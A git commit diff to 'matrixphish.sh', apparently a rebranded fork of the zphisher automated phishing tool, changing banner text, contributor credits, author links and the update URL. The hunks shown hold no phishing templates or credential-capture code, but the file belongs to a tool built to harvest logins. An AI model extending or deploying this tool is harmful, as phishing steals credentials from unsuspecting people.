0cc8440388785ea41151277e6d87063244ab0927
matrixbruh <isaqulovusanboy1@gmail.com>
2026-05-28 15:10:49 +0500

    Add files via upload

--- matrixphish.sh
+++ matrixphish.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 
-##   MATRIXPHISH 	: 	Automated Phishing Tool
+##   MATRIXPHISH 	: 	Automated Phishing  tool
 ##   Author 	: 	MATRIX
 ##   Version 	: 	2.3.5
 
@@ -73,8 +73,19 @@
 ##
 ##    The precise terms and conditions for copying, distribution and
 ##    modification follow.
-    
+##
+##      Copyright (C) 2022  
+##
 
+##   THANKS TO :
+##   1RaY-1 - https://github.com/1RaY-1
+##   Aditya Shakya - https://github.com/adi1090x
+##   Ali Milani Amin - https://github.com/AliMilani
+##   Ignitetch  - https://github.com/Ignitetch/AdvPhishing
+##   Moises Tapia - https://github.com/MoisesTapia
+##   Mr.Derek - https://github.com/E343IO
+##   Mustakim Ahmed - https://github.com/bdhackers009
+##   TheLinuxChoice - https://twitter.com/linux_choice
 
 
 __version__="2.3.5"
@@ -151,9 +162,9 @@ kill_pid() {
 # Check for a newer release
 check_update(){
 	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
-	relase_url='https://github.com/matrixbruh/MatrixPhish.git'
+	relase_url=''
 	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
-	tarball_url=""
+	tarball_url="https://github.com/htr-tech/zphisher/archive/refs/tags/${new_version}.tar.gz"
 
 	if [[ $new_version != $__version__ ]]; then
 		echo -ne "${ORANGE}update found\n"${WHITE}
@@ -169,7 +180,7 @@ check_update(){
 			rm -f .zphisher.tar.gz
 			popd > /dev/null 2>&1
 			{ sleep 3; clear; banner_small; }
-			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run MatrixPhish again\n\n"${WHITE}
+			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run zphisher again\n\n"${WHITE}
 			{ reset_color ; exit 1; }
 		else
 			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading."
@@ -197,7 +208,7 @@ banner() {
 	printf "${ORANGE}|_|  |_|\\\\__,_|\\\\__|_|  |_|   \\\\_\\\\_|    |_| |_|_|___/_| |_|\n"
 	printf "${ORANGE}                                                   \n"
 	printf "${ORANGE}                                 ${RED}Version : ${__version__}\n\n"
-	printf "${GREEN}[${WHITE}-${GREEN}]${CYAN} MatrixPhish by MATRIX${WHITE}\n"
+	printf "${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by MATRIX${WHITE}\n"
 }
 
 ## Small Banner (Tog'rilangan)
@@ -329,9 +340,9 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN} Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
-		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/htr-tech
-		${GREEN} Social   ${RED}:  ${CYAN}https://tahmidrayat.is-a.dev
+		${GREEN} Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}matrix ${RED}]
+		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/matrixbruh
+		${GREEN} Social   ${RED}:  ${CYAN}https://devhorizon-io.web.app
 		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}
 
 		${WHITE} ${REDBG}Warning:${RESETBG}
